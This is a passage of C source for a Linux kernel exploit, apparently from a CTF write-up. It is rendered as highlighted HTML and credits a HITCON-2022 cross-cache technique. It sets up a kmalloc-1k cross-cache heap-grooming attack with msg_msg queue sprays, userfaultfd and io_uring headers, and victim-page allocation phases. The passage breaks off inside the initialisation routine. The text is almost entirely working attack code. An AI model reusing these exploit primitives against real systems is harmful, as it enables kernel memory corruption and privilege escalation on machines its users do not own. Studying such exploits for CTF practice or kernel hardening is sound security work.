<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//gcc -pthread -no-pie -static ../../exploit.c  -o exp 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define _GNU_SOURCE
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;inttypes.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;limits.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stddef.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;poll.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdnoreturn.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/userfaultfd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ipc.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/msg.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/timerfd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/resource.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/capability.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/xattr.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/io_uring.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/membarrier.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/io_uring.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/membarrier.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define logd(fmt, ...) fprintf(stderr, (fmt), ##__VA_ARGS__)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define CC_OVERFLOW_FACTOR 5    </span><span class="c1">// Used to handle fragmentation
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define OBJS_PER_SLAB 8         </span><span class="c1">// Fetch this from /sys/kernel/slab/kmalloc-1k/objs_per_slab
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define CPU_PARTIAL 24          </span><span class="c1">// Fetch this from /sys/kernel/slab/kmalloc-1k/cpu_partial
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define MSG_SIZE 0x400-48       </span><span class="c1">// kmalloc-1k (because CONFIG_MEMCG_KMEM is disabled, we can use msg_msg)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">noreturn</span> <span class="kt">void</span> <span class="nf">fatal</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* 
</span></span></span><span class="line"><span class="cl"><span class="cm">Cross-cache abstraction taken from https://org.anize.rs/HITCON-2022/pwn/fourchain-kernel
</span></span></span><span class="line"><span class="cl"><span class="cm">Notes that here is minor adjustments that we made to the abstraction
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="k">enum</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">CC_RESERVE_PARTIAL_LIST</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">CC_ALLOC_VICTIM_PAGE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">CC_FILL_VICTIM_PAGE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">CC_EMPTY_VICTIM_PAGE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">CC_OVERFLOW_PARTIAL_LIST</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">cross_cache</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">objs_per_slab</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">cpu_partial</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int64_t</span> <span class="o">*</span><span class="n">overflow_objs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int64_t</span> <span class="o">*</span><span class="n">pre_victim_objs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int64_t</span> <span class="o">*</span><span class="n">post_victim_objs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">phase</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">allocate</span><span class="p">)(</span><span class="kt">int64_t</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">free</span><span class="p">)(</span><span class="kt">int64_t</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">kmalloc1k_cc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">cc_allocate</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                  <span class="kt">int64_t</span> <span class="o">*</span><span class="n">repo</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                  <span class="kt">uint32_t</span> <span class="n">to_alloc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">to_alloc</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int64_t</span> <span class="n">ref</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="nf">allocate</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">ref</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">ref</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">cc_free</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                              <span class="kt">int64_t</span> <span class="o">*</span><span class="n">repo</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                              <span class="kt">uint32_t</span> <span class="n">to_free</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                              <span class="kt">bool</span> <span class="n">per_slab</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">to_free</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// if per_slab is true, The target is to free one object per slab.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="n">per_slab</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">cc</span><span class="o">-&gt;</span><span class="nf">free</span><span class="p">(</span><span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">reserve_partial_list_amount</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">to_alloc</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">*</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">cpu_partial</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">CC_OVERFLOW_FACTOR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_allocate</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span><span class="p">,</span> <span class="n">to_alloc</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">allocate_victim_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">to_alloc</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_allocate</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">pre_victim_objs</span><span class="p">,</span> <span class="n">to_alloc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">fill_victim_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">to_alloc</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_allocate</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">post_victim_objs</span><span class="p">,</span> <span class="n">to_alloc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">empty_victim_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">to_free</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_free</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">pre_victim_objs</span><span class="p">,</span> <span class="n">to_free</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">to_free</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_free</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">post_victim_objs</span><span class="p">,</span> <span class="n">to_free</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">overflow_partial_list</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">to_free</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">*</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">cpu_partial</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">CC_OVERFLOW_FACTOR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_free</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span><span class="p">,</span> <span class="n">to_free</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">free_all</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">to_free</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">*</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">cpu_partial</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span><span class="o">*</span> <span class="n">CC_OVERFLOW_FACTOR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_free</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span><span class="p">,</span> <span class="n">to_free</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">empty_victim_page</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int64_t</span> <span class="nf">cc_next</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">phase</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">CC_RESERVE_PARTIAL_LIST</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">reserve_partial_list_amount</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">CC_ALLOC_VICTIM_PAGE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">allocate_victim_page</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">CC_FILL_VICTIM_PAGE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">fill_victim_page</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">CC_EMPTY_VICTIM_PAGE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">empty_victim_page</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">CC_OVERFLOW_PARTIAL_LIST</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">overflow_partial_list</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">cc_deinit</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free_all</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">pre_victim_objs</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">post_victim_objs</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init_msq</span><span class="p">(</span><span class="kt">int64_t</span> <span class="o">*</span><span class="n">repo</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">to_alloc</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">to_alloc</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">msgget</span><span class="p">(</span><span class="n">IPC_PRIVATE</span><span class="p">,</span> <span class="n">IPC_CREAT</span> <span class="o">|</span> <span class="mo">0666</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;[-] msgget() fail</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="nf">cc_init</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">objs_per_slab</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="kt">uint32_t</span> <span class="n">cpu_partial</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="kt">void</span> <span class="o">*</span><span class="n">allocate_fptr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="kt">void</span> <span class="o">*</span><span class="n">free_fptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;init_cross_cache:malloc</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">=</span> <span class="n">objs_per_slab</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">cpu_partial</span> <span class="o">=</span> <span class="n">cpu_partial</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">free</span> <span class="o">=</span> <span class="n">free_fptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">allocate</span> <span class="o">=</span> <span class="n">allocate_fptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">phase</span> <span class="o">=</span> <span class="n">CC_RESERVE_PARTIAL_LIST</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">n_overflow</span> <span class="o">=</span> <span class="n">objs_per_slab</span> <span class="o">*</span> <span class="p">(</span><span class="n">cpu_partial</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">CC_OVERFLOW_FACTOR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">n_previctim</span> <span class="o">=</span> <span class="n">objs_per_slab</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">n_postvictim</span> <span class="o">=</span> <span class="n">objs_per_slab</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="o">*</span> <span class="n">n_overflow</span><span class="p">);</span>
